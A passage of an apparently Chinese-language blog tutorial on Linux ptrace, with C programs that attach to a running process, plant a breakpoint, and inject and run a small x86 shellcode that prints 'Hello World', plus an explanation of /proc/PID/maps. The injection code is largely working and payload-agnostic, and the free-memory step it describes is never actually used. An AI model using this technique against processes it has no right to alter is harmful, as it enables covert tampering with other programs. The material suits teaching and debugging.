<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;asm/ptrace-abi.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> long_size = <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*主要通过PTRACE_PEEKDATA获取内存中的内容*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getdata</span><span class="params">(pid_t child, <span class="keyword">long</span> addr, </span><br><span class="line">             <span class="keyword">char</span> *str, <span class="keyword">int</span> len)</span></span><br><span class="line"></span>&#123;   </span><br><span class="line">    <span class="keyword">char</span> *laddr;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">union</span> u&#123;</span><br><span class="line">            <span class="keyword">long</span> val;</span><br><span class="line">            <span class="keyword">char</span> chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / long_size;</span><br><span class="line">    laddr = str;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">        data.val = ptrace(PTRACE_PEEKDATA, child, </span><br><span class="line">                          addr + i * <span class="number">4</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(laddr, data.chars, long_size);</span><br><span class="line">        ++i;</span><br><span class="line">        laddr += long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % long_size;</span><br><span class="line">    <span class="keyword">if</span>(j != <span class="number">0</span>) &#123;</span><br><span class="line">        data.val = ptrace(PTRACE_PEEKDATA, child, </span><br><span class="line">                          addr + i * <span class="number">4</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(laddr, data.chars, j);</span><br><span class="line">    &#125;</span><br><span class="line">    str[len] = <span class="string">' '</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*与getdata相反，主要通过PTRACE_POKEDATA向内存写内容*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putdata</span><span class="params">(pid_t child, <span class="keyword">long</span> addr, </span><br><span class="line">             <span class="keyword">char</span> *str, <span class="keyword">int</span> len)</span></span><br><span class="line"></span>&#123;   </span><br><span class="line">    <span class="keyword">char</span> *laddr;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">union</span> u &#123;</span><br><span class="line">            <span class="keyword">long</span> val;</span><br><span class="line">            <span class="keyword">char</span> chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / long_size;</span><br><span class="line">    laddr = str;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, long_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, </span><br><span class="line">               addr + i * <span class="number">4</span>, data.val);</span><br><span class="line">        ++i;</span><br><span class="line">        laddr += long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % long_size;</span><br><span class="line">    <span class="keyword">if</span>(j != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, </span><br><span class="line">               addr + i * <span class="number">4</span>, data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;   </span><br><span class="line">    <span class="keyword">pid_t</span> traced_process;</span><br><span class="line">    <span class="keyword">struct</span> user_regs_struct regs, newregs;</span><br><span class="line">    <span class="keyword">long</span> ins;</span><br><span class="line">    <span class="comment">/* int 0x80, int3 */</span></span><br><span class="line">    <span class="keyword">char</span> code[] = &#123;<span class="number">0xcd</span>,<span class="number">0x80</span>,<span class="number">0xcc</span>,<span class="number">0</span>&#125;; <span class="comment">//将要嵌入的代码</span></span><br><span class="line">    <span class="keyword">char</span> backup[<span class="number">4</span>]; <span class="comment">//用于保存原内存内容便于恢复</span></span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Usage: %s &lt;pid to be traced&gt; "</span>, </span><br><span class="line">               argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    traced_process = atoi(argv[<span class="number">1</span>]); </span><br><span class="line">    <span class="comment">/*attack 目标进程traced_process*/</span></span><br><span class="line">    ptrace(PTRACE_ATTACH, traced_process, </span><br><span class="line">           <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>); <span class="comment">//等待系统通知</span></span><br><span class="line">    <span class="comment">/*通过PTRACE_GETREGS获取目标进程的所有寄存器值*/</span></span><br><span class="line">    ptrace(PTRACE_GETREGS, traced_process, </span><br><span class="line">           <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    <span class="comment">/* 将原指令备份到backup中 */</span></span><br><span class="line">    getdata(traced_process, regs.eip, backup, <span class="number">3</span>);</span><br><span class="line">    <span class="comment">/* 将端点指令写入内存中 */</span></span><br><span class="line">    putdata(traced_process, regs.eip, code, <span class="number">3</span>);</span><br><span class="line">    <span class="comment">/* 让目标进程继续执行并执行我们插入的int 3指令 */</span></span><br><span class="line">    ptrace(PTRACE_CONT, traced_process, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The process stopped, putting back "</span></span><br><span class="line">           <span class="string">"the original instructions "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Press &lt;enter&gt; to continue "</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="comment">/*将备份的原指令恢复到内存中*/</span></span><br><span class="line">    putdata(traced_process, regs.eip, backup, <span class="number">3</span>);</span><br><span class="line">    <span class="comment">/* 让eip寄存器执向的内存恢复到执行原始位置，让目标进程继续执行 */</span></span><br><span class="line">    ptrace(PTRACE_SETREGS, traced_process, </span><br><span class="line">           <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    <span class="comment">/* detach 目标进程*/</span></span><br><span class="line">    ptrace(PTRACE_DETACH, traced_process, </span><br><span class="line">           <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>目标测试程序：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123; </span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"pid=%d\n"</span>,getpid());</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"My counter: %d \n"</span>, i);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先运行目标程序<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">~/code/ptrace<span class="comment"># ./test</span></span><br><span class="line">pid=<span class="number">29158</span></span><br><span class="line">My counter: <span class="number">0</span> </span><br><span class="line">My counter: <span class="number">1</span> </span><br><span class="line">My counter: <span class="number">2</span> </span><br><span class="line">My counter: <span class="number">3</span> </span><br><span class="line">//此处中断</span><br><span class="line">My counter: <span class="number">4</span> </span><br><span class="line">My counter: <span class="number">5</span> </span><br><span class="line">My counter: <span class="number">6</span> </span><br><span class="line">My counter: <span class="number">7</span> </span><br><span class="line">My counter: <span class="number">8</span> </span><br><span class="line">My counter: <span class="number">9</span></span><br></pre></td></tr></table></figure></p>
<p>test执行中执行ptrace程序<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/code/ptrace<span class="comment"># ./ptrace2 30323</span></span><br><span class="line">The process stopped, putting back the original instructions Press &lt;enter&gt; to <span class="built_in">continue</span>  //回车后中断结束</span><br></pre></td></tr></table></figure></p>
<h2 id="ptrace实现进程代码注入">ptrace实现进程代码注入</h2><p>上面的例子我们使用了我们仅仅向内存中插入了int 3指令，是进程中断。我们当然可以将一段shellcode写入执行…</p>
<p>测试代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;asm/ptrace-abi.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> long_size = <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getdata</span><span class="params">(pid_t child, <span class="keyword">long</span> addr, </span><br><span class="line">             <span class="keyword">char</span> *str, <span class="keyword">int</span> len)</span></span><br><span class="line"></span>&#123;   </span><br><span class="line">    <span class="keyword">char</span> *laddr;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">union</span> u&#123;</span><br><span class="line">            <span class="keyword">long</span> val;</span><br><span class="line">            <span class="keyword">char</span> chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / long_size;</span><br><span class="line">    laddr = str;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">        data.val = ptrace(PTRACE_PEEKDATA, child, </span><br><span class="line">                          addr + i * <span class="number">4</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(laddr, data.chars, long_size);</span><br><span class="line">        ++i;</span><br><span class="line">        laddr += long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % long_size;</span><br><span class="line">    <span class="keyword">if</span>(j != <span class="number">0</span>) &#123;</span><br><span class="line">        data.val = ptrace(PTRACE_PEEKDATA, child, </span><br><span class="line">                          addr + i * <span class="number">4</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(laddr, data.chars, j);</span><br><span class="line">    &#125;</span><br><span class="line">    str[len] = <span class="string">' '</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putdata</span><span class="params">(pid_t child, <span class="keyword">long</span> addr, </span><br><span class="line">             <span class="keyword">char</span> *str, <span class="keyword">int</span> len)</span></span><br><span class="line"></span>&#123;   </span><br><span class="line">    <span class="keyword">char</span> *laddr;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">union</span> u &#123;</span><br><span class="line">            <span class="keyword">long</span> val;</span><br><span class="line">            <span class="keyword">char</span> chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / long_size;</span><br><span class="line">    laddr = str;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, long_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, </span><br><span class="line">               addr + i * <span class="number">4</span>, data.val);</span><br><span class="line">        ++i;</span><br><span class="line">        laddr += long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % long_size;</span><br><span class="line">    <span class="keyword">if</span>(j != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, </span><br><span class="line">               addr + i * <span class="number">4</span>, data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">freespaceaddr</span><span class="params">(pid_t pid)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">char</span> filename[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">char</span> line[<span class="number">85</span>];</span><br><span class="line">    <span class="keyword">long</span> addr;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(filename, <span class="string">"/proc/%d/maps"</span>, pid);</span><br><span class="line">    fp = fopen(filename, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span>(fgets(line, <span class="number">85</span>, fp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">sscanf</span>(line, <span class="string">"%lx-%*lx %*s %*s %s"</span>, &amp;addr, </span><br><span class="line">               str, str, str, str);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(str, <span class="string">"00:00"</span>) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123; </span><br><span class="line"><span class="keyword">pid_t</span> traced_process;</span><br><span class="line">    <span class="keyword">struct</span> user_regs_struct regs, newregs;</span><br><span class="line">    <span class="keyword">long</span> ins;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">41</span>;</span><br><span class="line">    <span class="keyword">char</span> insertcode[] =</span><br><span class="line">        <span class="string">"\xeb\x15\x5e\xb8\x04\x00"</span></span><br><span class="line">        <span class="string">"\x00\x00\xbb\x02\x00\x00\x00\x89\xf1\xba"</span></span><br><span class="line">        <span class="string">"\x0c\x00\x00\x00\xcd\x80\xcc\xe8\xe6\xff"</span></span><br><span class="line">        <span class="string">"\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f"</span></span><br><span class="line">        <span class="string">"\x72\x6c\x64\x0a\x00"</span>;</span><br><span class="line">    <span class="keyword">char</span> backup[len];</span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Usage: %s &lt;pid to be traced&gt; "</span>, </span><br><span class="line">               argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    traced_process = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    ptrace(PTRACE_ATTACH, traced_process, </span><br><span class="line">           <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_GETREGS, traced_process, </span><br><span class="line">           <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    getdata(traced_process, regs.eip, backup, len);</span><br><span class="line">    putdata(traced_process, regs.eip, </span><br><span class="line">            insertcode, len);</span><br><span class="line">    ptrace(PTRACE_SETREGS, traced_process, </span><br><span class="line">           <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    ptrace(PTRACE_CONT, traced_process, </span><br><span class="line">           <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The process stopped, Putting back "</span></span><br><span class="line">           <span class="string">"the original instructions "</span>);</span><br><span class="line">    putdata(traced_process, regs.eip, backup, len);</span><br><span class="line">    ptrace(PTRACE_SETREGS, traced_process, </span><br><span class="line">           <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Letting it continue with "</span></span><br><span class="line">           <span class="string">"original flow "</span>);</span><br><span class="line">    ptrace(PTRACE_DETACH, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们只是注如了一个<code>hello world</code>程序进行测试。<br>这里总体思路与前小节一样。由于上面往内存中嵌入的只是四个字节，而当我们将把一段代码直接像之前一样简单的写入正在执行的指令流中是不现实的，所以这里我们需要将代码指令插入到进程的自由内存空间中。通过查看<code>/proc/PID/maps</code>文件就可以获得可用的进程自由空间分布。</p>
<p>这里我们先介绍下进程的内存映射</p>
<p>查看进程内存映射命令</p>
<blockquote>
<p>cat /proc/进程id/maps</p>
</blockquote>
<p>我们运行上面的test程序然后查看其内存映射如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">~/code/ptrace<span class="comment"># cat /proc/30617/maps </span></span><br><span class="line"><span class="number">005</span>bf000-<span class="number">005</span>c0000 r-xp <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [vdso]</span><br><span class="line"><span class="number">009</span>a4000-<span class="number">00</span>af7000 r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">134385</span>     /lib/tls/i686/cmov/libc-<span class="number">2.11</span>.<span class="number">1</span>.so</span><br><span class="line"><span class="number">00</span>af7000-<span class="number">00</span>af8000 ---p <span class="number">00153000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">134385</span>     /lib/tls/i686/cmov/libc-<span class="number">2.11</span>.<span class="number">1</span>.so</span><br><span class="line"><span class="number">00</span>af8000-<span class="number">00</span>afa000 r--p <span class="number">00153000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">134385</span>     /lib/tls/i686/cmov/libc-<span class="number">2.11</span>.<span class="number">1</span>.so</span><br><span class="line"><span class="number">00</span>afa000-<span class="number">00</span>afb000 rw-p <span class="number">00155000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">134385</span>     /lib/tls/i686/cmov/libc-<span class="number">2.11</span>.<span class="number">1</span>.so</span><br><span class="line"><span class="number">00</span>afb000-<span class="number">00</span>afe000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line"><span class="number">00</span>bf8000-<span class="number">00</span>c13000 r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">129989</span>     /lib/ld-<span class="number">2.11</span>.<span class="number">1</span>.so</span><br><span class="line"><span class="number">00</span>c13000-<span class="number">00</span>c14000 r--p <span class="number">0001</span>a000 <span class="number">08</span>:<span class="number">01</span> <span class="number">129989</span>     /lib/ld-<span class="number">2.11</span>.<span class="number">1</span>.so</span><br><span class="line"><span class="number">00</span>c14000-<span class="number">00</span>c15000 rw-p <span class="number">0001</span>b000 <span class="number">08</span>:<span class="number">01</span> <span class="number">129989</span>     /lib/ld-<span class="number">2.11</span>.<span class="number">1</span>.so</span><br><span class="line"><span class="number">08048000</span>-<span class="number">08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">149844</span>     /root/code/ptrace_1/<span class="built_in">test</span>1</span><br><span class="line"><span class="number">08049000</span>-<span class="number">0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">149844</span>     /root/code/ptrace_1/<span class="built_in">test</span>1</span><br><span class="line"><span class="number">0804</span>a000-<span class="number">0804</span>b000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">149844</span>     /root/code/ptrace_1/<span class="built_in">test</span>1</span><br><span class="line">b77d5000-b77d6000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line">b77e3000-b77e6000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line">bfa31000-bfa46000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [stack]</span><br></pre></td></tr></table></figure>
<p>显然<code>/proc/PID/maps</code>是个临时的文件，进程结束也就消失了。<br>查看该文件，瞅瞅进程的虚拟地址空间是如何使用的。该文件一共分为6列，每一列具体含义如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">地址</th>
<th style="text-align:center">权限</th>
<th style="text-align:center">偏移量</th>
<th style="text-align:center">设备</th>
<th style="text-align:center">节点</th>
<th style="text-align:center">路径</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">库在进程中的内存范围</td>
<td style="text-align:center">虚拟内存的权限</td>
<td style="text-align:center">虚拟内存区域在映射文件中的偏移</td>
<td style="text-align:center">映射文件的主/次设备号</td>
<td style="text-align:center">映射文件的节点号</td>
<td style="text-align:center">映射文件路径</td>
</tr>
</tbody>
</table>
